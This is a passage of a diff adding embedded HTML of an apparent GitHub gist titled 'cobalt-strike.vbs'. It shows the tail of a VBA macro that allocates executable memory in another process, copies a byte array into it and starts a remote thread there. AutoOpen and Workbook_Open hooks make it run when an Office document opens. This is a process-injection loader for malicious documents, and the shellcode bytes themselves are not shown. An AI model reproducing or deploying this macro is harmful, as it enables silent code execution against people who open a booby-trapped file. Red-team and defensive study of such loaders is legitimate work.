+        <td id="file-cobalt-strike-vbs-LC62" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L63" class="blob-num js-line-number" data-line-number="63"></td>
+        <td id="file-cobalt-strike-vbs-LC63" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">rwxpage</span> <span class="pl-smi">=</span> <span class="pl-smi">AllocStuff(pInfo.hProcess,</span> <span class="pl-s">0</span><span class="pl-smi">,</span> <span class="pl-smi">UBound(myArray),</span> <span class="pl-s">&amp;H1000</span><span class="pl-smi">,</span> <span class="pl-s">&amp;H40</span><span class="pl-smi">)</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L64" class="blob-num js-line-number" data-line-number="64"></td>
+        <td id="file-cobalt-strike-vbs-LC64" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">For</span> <span class="pl-smi">offset</span> <span class="pl-smi">=</span> <span class="pl-smi">LBound(myArray)</span> <span class="pl-k">To</span> <span class="pl-smi">UBound(myArray)</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L65" class="blob-num js-line-number" data-line-number="65"></td>
+        <td id="file-cobalt-strike-vbs-LC65" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">myByte</span> <span class="pl-smi">=</span> <span class="pl-smi">myArray(offset)</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L66" class="blob-num js-line-number" data-line-number="66"></td>
+        <td id="file-cobalt-strike-vbs-LC66" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">res</span> <span class="pl-smi">=</span> <span class="pl-smi">WriteStuff(pInfo.hProcess,</span> <span class="pl-smi">rwxpage</span> <span class="pl-smi">+</span> <span class="pl-smi">offset,</span> <span class="pl-smi">myByte,</span> <span class="pl-s">1</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-s">0</span><span class="pl-smi">&amp;)</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L67" class="blob-num js-line-number" data-line-number="67"></td>
+        <td id="file-cobalt-strike-vbs-LC67" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Next</span> <span class="pl-smi">offset</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L68" class="blob-num js-line-number" data-line-number="68"></td>
+        <td id="file-cobalt-strike-vbs-LC68" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">res</span> <span class="pl-smi">=</span> <span class="pl-smi">CreateStuff(pInfo.hProcess,</span> <span class="pl-s">0</span><span class="pl-smi">,</span> <span class="pl-s">0</span><span class="pl-smi">,</span> <span class="pl-smi">rwxpage,</span> <span class="pl-s">0</span><span class="pl-smi">,</span> <span class="pl-s">0</span><span class="pl-smi">,</span> <span class="pl-s">0</span><span class="pl-smi">)</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L69" class="blob-num js-line-number" data-line-number="69"></td>
+        <td id="file-cobalt-strike-vbs-LC69" class="blob-code blob-code-inner js-file-line"><span class="pl-k">End</span> <span class="pl-k">Sub</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L70" class="blob-num js-line-number" data-line-number="70"></td>
+        <td id="file-cobalt-strike-vbs-LC70" class="blob-code blob-code-inner js-file-line"><span class="pl-k">Sub</span> <span class="pl-smi">AutoOpen()</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L71" class="blob-num js-line-number" data-line-number="71"></td>
+        <td id="file-cobalt-strike-vbs-LC71" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">Auto_Open</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L72" class="blob-num js-line-number" data-line-number="72"></td>
+        <td id="file-cobalt-strike-vbs-LC72" class="blob-code blob-code-inner js-file-line"><span class="pl-k">End</span> <span class="pl-k">Sub</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L73" class="blob-num js-line-number" data-line-number="73"></td>
+        <td id="file-cobalt-strike-vbs-LC73" class="blob-code blob-code-inner js-file-line"><span class="pl-k">Sub</span> <span class="pl-smi">Workbook_Open()</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L74" class="blob-num js-line-number" data-line-number="74"></td>
+        <td id="file-cobalt-strike-vbs-LC74" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">Auto_Open</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L75" class="blob-num js-line-number" data-line-number="75"></td>
+        <td id="file-cobalt-strike-vbs-LC75" class="blob-code blob-code-inner js-file-line"><span class="pl-k">End</span> <span class="pl-k">Sub</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L76" class="blob-num js-line-number" data-line-number="76"></td>
+        <td id="file-cobalt-strike-vbs-LC76" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+</tbody></table>
+
+
+  </div>
+
+  </div>
+</div>
+
+      </div>
+      <div class="gist-meta">
+        <a href="https://gist.github.com/magnusstubman/18397dfd4fc6d22892cd4ee183747ef7/raw/2f55a0e78394bfa4991ae4d9e21478110b8eea94/cobalt-strike.vbs" style="float:right">view raw</a>
+        <a href="https://gist.github.com/magnusstubman/18397dfd4fc6d22892cd4ee183747ef7#file-cobalt-strike-vbs">cobalt-strike.vbs</a>
+        hosted with ❤ by <a href="https://github.com">GitHub</a>
+      </div>
+    </div>
+</div>
+
+
